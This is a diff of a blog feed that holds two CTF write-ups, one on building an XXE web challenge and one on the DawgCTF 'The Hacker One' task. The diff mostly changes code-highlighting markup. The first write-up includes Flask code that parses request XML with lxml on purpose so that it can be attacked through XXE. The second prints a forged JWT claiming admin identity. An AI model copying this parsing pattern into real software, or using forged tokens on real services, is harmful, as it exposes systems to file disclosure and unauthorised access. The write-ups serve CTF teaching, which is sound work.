-            &lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;settings changed successfully&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;nf&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;settings changed successfully&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
           &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -413,26 +960,26 @@ fetched with template I utilized it&lt;/p&gt;
 &lt;p&gt;adding xml support was easy but it turns out the normal xml library isn’t xxe-able by default
 after reading more about it, I realized lxml was xxe-able by default :)&lt;/p&gt;
 
-&lt;p&gt;&lt;del&gt;make the &lt;code class=&quot;highlighter-rouge&quot;&gt;/customize&lt;/code&gt; endpoint accept json and xml&lt;/del&gt;&lt;/p&gt;
+&lt;p&gt;&lt;del&gt;make the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/customize&lt;/code&gt; endpoint accept json and xml&lt;/del&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;day-3-ended-in-here&quot;&gt;day 3 ended in here&lt;/h3&gt;
 
 &lt;p&gt;at the other day I just plugged lxml code with the app and here we go&lt;/p&gt;
 
-&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;lxml&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;etree&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;etree&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;XMLParser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;etree&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fromstring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;post_color&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;post_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;w&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getchildren&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;color&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;post_color&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;size&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;post_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter_by&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'username'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;first&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter_by&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'username'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;size&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;post_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;color&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;post_color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;commit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lxml&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;etree&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;etree&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;XMLParser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;etree&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;fromstring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;post_color&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;post_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;w&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getchildren&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;post_color&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;post_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;filter_by&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;first&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;filter_by&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;post_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;post_color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;commit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -445,7 +992,7 @@ nope it’s not :P&lt;/p&gt;
 now I had another task I didn’t think of&lt;/p&gt;
 
 &lt;p&gt;I tried to do some stuff with docker but most of them fucked up so I decided to get help from a friend who can actually
-use docker decently and plus he was working with the infra team on the CTF so I sent a message to &lt;code class=&quot;highlighter-rouge&quot;&gt;MEhrn00&lt;/code&gt; and he sent
+use docker decently and plus he was working with the infra team on the CTF so I sent a message to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MEhrn00&lt;/code&gt; and he sent
 me a basic alpine linux DockerFile&lt;/p&gt;
 
 &lt;div class=&quot;language-dockerfile highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; alpine:3.7&lt;/span&gt;
@@ -471,13 +1018,13 @@ me a basic alpine linux DockerFile&lt;/p&gt;
 &lt;p&gt;and it didn’t work, because lxml installation was erroring for no reason&lt;/p&gt;
 
 &lt;p&gt;&lt;em&gt;weird error I don’t understand&lt;/em&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; gcc -Wno-unused-result -Wsign-compare -DNDEBUG -g -fwrapv -O3 -Wall -Os -fomit-frame-pointer -g -Os -fomit-frame-pointer -g -Os -fomit-frame-pointer -g -DTHREAD_STACK_SIZE=0x100000 -fPIC -DCYTHON_CLINE_IN_TRACEBACK=0 -Isrc -Isrc/lxml/includes -I/usr/include/python3.6m -c src/lxml/etree.c -o build/temp.linux-x86_64-3.6/src/lxml/etree.o -w
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; gcc -Wno-unused-result -Wsign-compare -DNDEBUG -g -fwrapv -O3 -Wall -Os -fomit-frame-pointer -g -Os -fomit-frame-pointer -g -Os -fomit-frame-pointer -g -DTHREAD_STACK_SIZE=0x100000 -fPIC -DCYTHON_CLINE_IN_TRACEBACK=0 -Isrc -Isrc/lxml/includes -I/usr/include/python3.6m -c src/lxml/etree.c -o build/temp.linux-x86_64-3.6/src/lxml/etree.o -w
     In file included from src/lxml/etree.c:692:0:
     src/lxml/includes/etree_defs.h:14:31: fatal error: libxml/xmlversion.h: No such file or directory
      #include &quot;libxml/xmlversion.h&quot;
                                    ^
     compilation terminated.
-    Compile failed: command 'gcc' failed with exit status 1
+    Compile failed: command &apos;gcc&apos; failed with exit status 1
     creating tmp
     cc -I/usr/include/libxml2 -c /tmp/xmlXPathInitf75pvacz.c -o tmp/xmlXPathInitf75pvacz.o
     /tmp/xmlXPathInitf75pvacz.c:1:26: fatal error: libxml/xpath.h: No such file or directory
@@ -487,7 +1034,7 @@ me a basic alpine linux DockerFile&lt;/p&gt;
     *********************************************************************************
     Could not find function xmlCheckVersion in library libxml2. Is libxml2 installed?
     *********************************************************************************
-    error: command 'gcc' failed with exit status 1
+    error: command &apos;gcc&apos; failed with exit status 1
     
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -514,11 +1061,11 @@ and I ended up with this&lt;/p&gt;
 &lt;span class=&quot;k&quot;&gt;EXPOSE&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; 7100&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;the app worked but …
-every time I tried to insert into the db I got &lt;code class=&quot;highlighter-rouge&quot;&gt;db only readable&lt;/code&gt;
+every time I tried to insert into the db I got &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;db only readable&lt;/code&gt;
 it was because I started the container as root but ran the code as uwsgi
 I had the option to start the container as the uwsgi users but I didn’t like this way
-and &lt;code class=&quot;highlighter-rouge&quot;&gt;chmod 777 file.db&lt;/code&gt; didn’t work too
-I found a way about putting the db file into a directory and &lt;code class=&quot;highlighter-rouge&quot;&gt;chown&lt;/code&gt;-ing the dir to make it work&lt;/p&gt;
+and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod 777 file.db&lt;/code&gt; didn’t work too
+I found a way about putting the db file into a directory and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chown&lt;/code&gt;-ing the dir to make it work&lt;/p&gt;
 
 &lt;div class=&quot;language-dockerfile highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; alpine:3.7&lt;/span&gt;
 
@@ -561,9 +1108,9 @@ it’s done&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;isn’t this challenge considered pure guessing and nothing was learned in here ?&lt;/strong&gt;&lt;/p&gt;
 
-&lt;p&gt;the &lt;code class=&quot;highlighter-rouge&quot;&gt;content-type&lt;/code&gt; thing is popular and it happened in a couple of real life applications,
+&lt;p&gt;the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;content-type&lt;/code&gt; thing is popular and it happened in a couple of real life applications,
 because you never know what the devs think of the app may have used xml before or it was in there for just in case
-&lt;code class=&quot;highlighter-rouge&quot;&gt;¯\_(ツ)_/¯&lt;/code&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;¯\_(ツ)_/¯&lt;/code&gt;
 also it was used in multiple CTFs before which got me amazed how really few people solved it like:&lt;/p&gt;
 
 &lt;ul&gt;
@@ -572,7 +1119,7 @@ also it was used in multiple CTFs before which got me amazed how really few peop
 
 &lt;p&gt;&lt;strong&gt;&lt;em&gt;wait but what about the math thing in the challenge description?&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
 
-&lt;p&gt;it is a second order equation, and the bug is a second order xxe :P&lt;/p&gt;</content><author><name>pop_eax</name></author><summary type="html">Special Order h@ctivityCon CTF 2020</summary></entry><entry><title type="html">The Hacker One writeup</title><link href="http://localhost:4000/blog/posts/ctf-writeup/web/2020/07/06/dawgctf20-thehackerone/" rel="alternate" type="text/html" title="The Hacker One writeup" /><published>2020-07-06T20:40:00+03:00</published><updated>2020-07-06T20:40:00+03:00</updated><id>http://localhost:4000/blog/posts/ctf-writeup/web/2020/07/06/dawgctf20-thehackerone</id><content type="html" xml:base="http://localhost:4000/blog/posts/ctf-writeup/web/2020/07/06/dawgctf20-thehackerone/">&lt;h1 id=&quot;the-hacker-one&quot;&gt;the hacker one&lt;/h1&gt;
+&lt;p&gt;it is a second order equation, and the bug is a second order xxe :P&lt;/p&gt;</content><author><name>pop_eax</name></author><summary type="html">Special Order h@ctivityCon CTF 2020</summary></entry><entry><title type="html">The Hacker One writeup</title><link href="http://localhost:4000/blog/posts/ctf-writeup/web/2020/07/06/dawgctf20-thehackerone/" rel="alternate" type="text/html" title="The Hacker One writeup" /><published>2020-07-06T19:40:00+02:00</published><updated>2020-07-06T19:40:00+02:00</updated><id>http://localhost:4000/blog/posts/ctf-writeup/web/2020/07/06/dawgctf20-thehackerone</id><content type="html" xml:base="http://localhost:4000/blog/posts/ctf-writeup/web/2020/07/06/dawgctf20-thehackerone/">&lt;h1 id=&quot;the-hacker-one&quot;&gt;the hacker one&lt;/h1&gt;
 
 &lt;p&gt;This challenge was one of the weirdest challenges, I have ever done
 so let’s begin:&lt;/p&gt;
@@ -584,22 +1131,22 @@ and found the following endpoints
 
 &lt;p&gt;from here I started to look at the endpoints&lt;/p&gt;
 
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/login&lt;/code&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/login&lt;/code&gt;
 &lt;img src=&quot;https://github.com/pop-eax/DawgCTF/raw/master/Web/the%20hacker%20one/imgs/login-1.png&quot; alt=&quot;login-1&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/register&lt;/code&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/register&lt;/code&gt;
 &lt;img src=&quot;https://github.com/pop-eax/DawgCTF/raw/master/Web/the%20hacker%20one/imgs/register-1.png&quot; alt=&quot;register&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/profile&lt;/code&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/profile&lt;/code&gt;
 &lt;img src=&quot;https://github.com/pop-eax/DawgCTF/raw/master/Web/the%20hacker%20one/imgs/profile-1.png&quot; alt=&quot;profile&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/debug&lt;/code&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/debug&lt;/code&gt;
 &lt;img src=&quot;https://github.com/pop-eax/DawgCTF/raw/master/Web/the%20hacker%20one/imgs/profile-1.png&quot; alt=&quot;debug&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/profile and /debug&lt;/code&gt; caught my eye, so I started crafting a jwt token to see the contents 
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/profile and /debug&lt;/code&gt; caught my eye, so I started crafting a jwt token to see the contents 
 and after a lot of trial and error and pain it worked&lt;/p&gt;
 
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;eyJhbGciOiJIUzI1NiJ9.eyJpZGVudGl0eSI6ImFkbWluIn0.VT1uf1w7wH4IZ7o2VddMipUJahZ44KtwUMkkOkqTFlc&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eyJhbGciOiJIUzI1NiJ9.eyJpZGVudGl0eSI6ImFkbWluIn0.VT1uf1w7wH4IZ7o2VddMipUJahZ44KtwUMkkOkqTFlc&lt;/code&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/DawgCTF/raw/master/Web/the%20hacker%20one/imgs/chromeDev-1.png&quot; alt=&quot;profile-2&quot; /&gt;
 &lt;img src=&quot;https://github.com/pop-eax/DawgCTF/raw/master/Web/the%20hacker%20one/imgs/profile-2.png&quot; alt=&quot;profile-2&quot; /&gt;
@@ -612,12 +1159,12 @@ and after a lot of trial and error and pain it worked&lt;/p&gt;
 and we kept on trying and trying for hours and nothing helped&lt;/p&gt;
 
 &lt;p&gt;so we just started from the beginning and backtracked our tracks :)
-I was just taking a look again at /profile and I was like &lt;code class=&quot;highlighter-rouge&quot;&gt;hmmmmm is that a f***ing VHOST&lt;/code&gt;&lt;/p&gt;
+I was just taking a look again at /profile and I was like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hmmmmm is that a f***ing VHOST&lt;/code&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/DawgCTF/raw/master/Web/the%20hacker%20one/imgs/vhost-2.png&quot; alt=&quot;vhost&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;I added all the weird domains to my &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; and started playing around 
-and it didn’t work like WTF, so I tried with the vhost from &lt;code class=&quot;highlighter-rouge&quot;&gt;/debug&lt;/code&gt; and it worked :P&lt;/p&gt;
+&lt;p&gt;I added all the weird domains to my &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; and started playing around 
+and it didn’t work like WTF, so I tried with the vhost from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/debug&lt;/code&gt; and it worked :P&lt;/p&gt;
 
